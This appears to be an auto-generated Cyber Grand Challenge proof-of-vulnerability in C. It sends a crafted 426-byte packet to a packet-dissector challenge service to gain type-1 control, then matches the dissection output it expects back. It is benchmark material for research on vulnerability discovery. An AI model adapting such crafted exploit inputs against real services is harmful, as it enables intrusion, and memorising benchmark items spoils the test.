#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xaa\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x92\x01\x00\x00\x8a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x8a\x01\x00\x00"
         "\xbd\x3e\xf8\x31\xff\xf7\x41\xab\xc9\xa9\x68\xfc\xad\x5f\xfb\xf2"
         "\xca\x6d\x4a\x75\x0d\x00\x00\x00\x41\x00\x01\x9d\x0b\xb0\xa6\x7a"
         "\x5b\x73\xfa\xba\xd5\x13\x4e\xd3\xf8\x01\xb6\x8e\x01\xa4\x41\x00"
         "\x2f\x2c\xed\xff\xe9\x2e\x1b\x6f\x94\xb2\xf9\x5a\x2a\x08\x7a\x12"
         "\xe7\xe9\xb3\x74\xf6\x6b\xad\x18\x0b\x62\x01\x45\x43\x77\x4e\xc3"
         "\x4c\x2c\x59\x6b\x82\x17\x31\x92\x6e\x66\x79\x80\x03\x7c\x7e\xb4"
         "\x0f\x70\xa0\x26\x0c\x66\x9e\xdb\x63\xf3\xc7\x03\x73\x20\xe7\xe4"
         "\x56\xda\xc0\xec\xda\xef\x62\x9a\x08\x80\xe2\xb8\x94\xab\x15\xa9"
         "\x8f\x15\xc8\x07\x46\x2b\x89\x47\x99\x3e\x1c\xd4\x0a\xfa\x92\x34"
         "\x3c\x9e\xb9\xef\x2c\x58\x83\xc3\x00\xe0\xe9\xb2\x95\x8f\xb1\x88"
         "\xf5\x2c\xf2\xc2\xd2\xb5\xa6\xd1\xa3\xf8\xcf\x1d\x3c\x11\x76\x32"
         "\xa0\xa0\x5b\x32\x92\xff\xba\xd5\x50\x56\x9d\xa3\xb2\xa4\xbf\x0f"
         "\xe8\x3f\x42\x45\x9f\xec\xc9\x9c\x1c\x1b\x63\xb2\x57\xd3\xcd\x16"
         "\x64\xad\xde\x93\x27\x51\x6d\x41\x84\xd3\x27\x39\x26\xac\x6a\x56"
         "\x0e\xfe\xca\x36\x6f\xe5\x79\x66\x7a\x3f\xc1\x1c\xa8\x77\x23\x30"
         "\x5d\xb3\x6f\x65\x87\x18\x7d\xb6\xf2\x85\x7a\x3a\xee\x18\xfb\x77"
         "\x24\x13\xb5\xb7\xf2\x27\xdb\x3f\xab\x66\xdd\xf2\xb9\xd5\x30\xf8"
         "\x2d\x84\x67\x3a\x5f\x15\x4a\xe5\x0e\xfe\x6a\x99\xc3\x8c\xdb\xaa"
         "\xf7\x06\x95\x67\x2f\x2d\x32\xfa\xe2\x1f\xa9\xc3\xd1\xde\x9d\x29"
         "\xe6\x8e\xf5\xaa\x1c\xa0\xe2\xc1\x70\x2c\x2b\x01\xd0\x01\x19\x01"
         "\x76\x01\x00\x93\x2b\x51\xa8\x8a\x04\x8f\x45\x41\x71\x01\x77\x28"
         "\x98\x11\xb7\x5c\x51\x2d\xb8\x49\xc8\x53\xfc\x0f\xa4\xd3\x08\x2a"
         "\xe5\x50\x09\x27\x41\x00\xba\x86\x85\x21\x60\xdc\x12\x07\x44\xfd"
         "\x7e\xe4\xa8\x2b\x2b\xb7\x3d\x61\x57\xfd\xf4\x91\x36\xd4\xee\x94"
         "\xa2\x1c\xb5\x01\x00\xe9\x2d\x16\x4f\x52";
      static unsigned int write_00001_00000_len = 426;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamatelodendron
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x74\x65\x6c\x6f\x64\x65"
         "\x6e\x64\x72\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
